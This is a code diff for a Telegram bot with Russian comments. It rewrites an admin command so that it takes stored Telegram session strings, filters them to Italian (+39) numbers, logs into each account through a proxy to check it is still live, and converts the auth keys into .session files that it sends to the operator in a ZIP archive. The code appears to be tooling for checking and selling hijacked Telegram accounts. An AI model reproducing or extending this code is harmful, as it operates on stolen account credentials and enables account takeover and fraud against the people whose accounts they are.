@@ -209,132 +209,127 @@ async def generate_full_session_data(session_info, client, me):
 
 @dp.message_handler(commands=['itim'])
 async def cmd_itim(message: types.Message):
-    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
+    user_id = message.from_user.id
+    
+    if not (is_main_admin(user_id) or is_light_admin(user_id)):
         await message.answer("❌ You don't have access to this command.")
         return
-
-    if not message.document:
-        await message.answer("❗ Please send a ZIP file containing sessions in export format.")
+    
+    await message.answer("🔍 Searching for valid Italian (+39) sessions...")
+    
+    # Получаем все сессии из нужной коллекции
+    if is_main_admin(user_id):
+        sessions = list(sessions_col.find({}))
+    else:
+        sessions = list(light_sessions_col.find({"owner_id": user_id}))
+    
+    if not sessions:
+        await message.answer("❌ No sessions found in database.")
         return
-
-    if not message.document.file_name.endswith('.zip'):
-        await message.answer("❌ The file must be a ZIP archive.")
+    
+    # Фильтруем только итальянские (+39)
+    italian_sessions = [s for s in sessions if s["phone"].startswith("+39")]
+    
+    if not italian_sessions:
+        await message.answer("❌ No Italian (+39) sessions found.")
         return
-
-    await message.answer("⏳ Starting import of Italian (+39) sessions, please wait...")
+    
+    await message.answer(f"🇮🇹 Found {len(italian_sessions)} Italian sessions. Checking validity...")
     
     temp_dir = tempfile.mkdtemp()
-    zip_path = os.path.join(temp_dir, message.document.file_name)
+    zip_path = os.path.join(temp_dir, f"italian_sessions_export_{user_id}.zip")
+    valid_count = 0
     
     try:
-        # Download the ZIP file
-        await message.document.download(destination_file=zip_path)
-        
-        imported_count = 0
-        skipped_count = 0
-        invalid_count = 0
-        
-        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
-            # First pass: count total files for progress
-            file_list = zip_ref.namelist()
-            total_files = len([f for f in file_list if f.endswith('.json')])
-            processed_files = 0
-            
-            # Process each JSON file
-            for filename in file_list:
-                if not filename.endswith('.json'):
-                    continue
-                    
-                processed_files += 1
-                phone = filename.replace('.json', '')
-                
-                # Check if phone is Italian (+39)
-                if not phone.startswith('39'):
-                    skipped_count += 1
-                    continue
-                    
-                # Update progress every 5 files
-                if processed_files % 5 == 0:
-                    await message.answer(
-                        f"⏳ Processing...\n"
-                        f"Files: {processed_files}/{total_files}\n"
-                        f"Imported: {imported_count} | Skipped: {skipped_count} | Invalid: {invalid_count}"
-                    )
-                
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for i, session in enumerate(italian_sessions, 1):
+                client = None
                 try:
-                    # Read JSON data
-                    with zip_ref.open(filename) as json_file:
-                        session_data = json.load(json_file)
-                        
-                    # Verify required fields
-                    if not all(k in session_data for k in ['phone', 'session']):
-                        invalid_count += 1
-                        continue
-                        
-                    # Check session validity
-                    client = TelegramClient(
-                        StringSession(session_data['session']),
-                        API_ID,
-                        API_HASH,
-                        proxy=proxy
-                    )
+                    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
+                    await client.connect()
                     
-                    try:
-                        await client.connect()
+                    if await client.is_user_authorized():
+                        me = await client.get_me()
+                        phone = session["phone"].replace("+", "")
                         
-                        if not await client.is_user_authorized():
-                            invalid_count += 1
-                            continue
-                            
-                        # If valid, save to appropriate collection
-                        session_record = {
-                            'phone': f"+{session_data['phone']}",
-                            'session': session_data['session'],
-                            'owner_id': message.from_user.id,
-                            'imported_at': datetime.now().isoformat()
-                        }
+                        # Генерируем данные сессии (как в экспорте)
+                        session_data = await generate_full_session_data(session, client, me)
                         
-                        if is_main_admin(message.from_user.id):
-                            # Avoid duplicates for main admin
-                            if not sessions_col.find_one({'phone': session_record['phone']}):
-                                sessions_col.insert_one(session_record)
-                                imported_count += 1
-                        else:
-                            # Light admin can have duplicates
-                            light_sessions_col.insert_one(session_record)
-                            imported_count += 1
-                            
-                    except Exception as e:
-                        invalid_count += 1
-                        logging.error(f"Error validating session {phone}: {str(e)}")
-                    finally:
-                        await client.disconnect()
+                        # Сохраняем JSON
+                        json_filename = f"{phone}.json"
+                        json_path = os.path.join(temp_dir, json_filename)
+                        with open(json_path, 'w', encoding='utf-8') as f:
+                            json.dump(session_data, f, indent=2, ensure_ascii=False)
+                        zipf.write(json_path, json_filename)
                         
+                        # Конвертируем в SQLite и добавляем в архив
+                        session_obj = StringSession(session["session"])
+                        session_file = os.path.join(temp_dir, f"{phone}.session")
+                        
+                        sqlite_session = SQLiteSession(session_file)
+                        sqlite_session.set_dc(
+                            session_obj.dc_id, 
+                            session_obj.server_address, 
+                            session_obj.port
+                        )
+                        sqlite_session.auth_key = session_obj.auth_key
+                        sqlite_session.save()
+                        
+                        zipf.write(session_file, f"{phone}.session")
+                        
+                        valid_count += 1
+                        
+                        # Удаляем временные файлы
+                        os.unlink(json_path)
+                        os.unlink(session_file)
+                        
+                        # Прогресс каждые 5 сессий
+                        if i % 5 == 0:
+                            await message.answer(
+                                f"⏳ Processed {i}/{len(italian_sessions)}\n"
+                                f"✅ Valid: {valid_count}"
+                            )
+                    
                 except Exception as e:
-                    invalid_count += 1
-                    logging.error(f"Error processing {filename}: {str(e)}")
+                    logging.error(f"Error checking session {session.get('phone')}: {str(e)}")
+                finally:
+                    if client:
+                        await client.disconnect()
         
-        # Final report
-        report = (
-            f"✅ Import completed:\n"
-            f"• Total files processed: {total_files}\n"
-            f"• Italian (+39) sessions imported: {imported_count}\n"
-            f"• Non-Italian sessions skipped: {skipped_count}\n"
-            f"• Invalid sessions skipped: {invalid_count}"
-        )
+        if valid_count == 0:
+            await message.answer("❌ No valid Italian sessions found.")
+            return
         
-        await message.answer(report)
+        # Отправляем архив пользователю
+        with open(zip_path, 'rb') as zip_file:
+            await bot.send_document(
+                chat_id=user_id,
+                document=zip_file,
+                caption=f"🇮🇹 Italian Sessions Export\n"
+                       f"• Total checked: {len(italian_sessions)}\n"
+                       f"• Valid sessions: {valid_count}\n\n"
+                       f"Format:\n"
+                       f"- [phone].json — session info\n"
+                       f"- [phone].session — SQLite session file",
+                reply_to_message_id=message.message_id
+            )
         
     except Exception as e:
-        await message.answer(f"❌ Import failed: {str(e)}")
+        await message.answer(f"❌ Export failed: {str(e)}")
     finally:
-        # Cleanup
+        # Удаляем временные файлы
+        for filename in os.listdir(temp_dir):
+            file_path = os.path.join(temp_dir, filename)
+            try:
+                if os.path.isfile(file_path):
+                    os.unlink(file_path)
+            except Exception as e:
+                logging.error(f"Failed to delete {file_path}: {str(e)}")
+        
         try:
-            if os.path.exists(zip_path):
-                os.unlink(zip_path)
             os.rmdir(temp_dir)
-        except Exception as e:
-            logging.error(f"Cleanup error: {str(e)}")
+        except OSError as e:
+            logging.error(f"Failed to remove directory {temp_dir}: {str(e)}")
 
 
 # Добавьте этот обработчик в раздел COMMAND HANDLERS
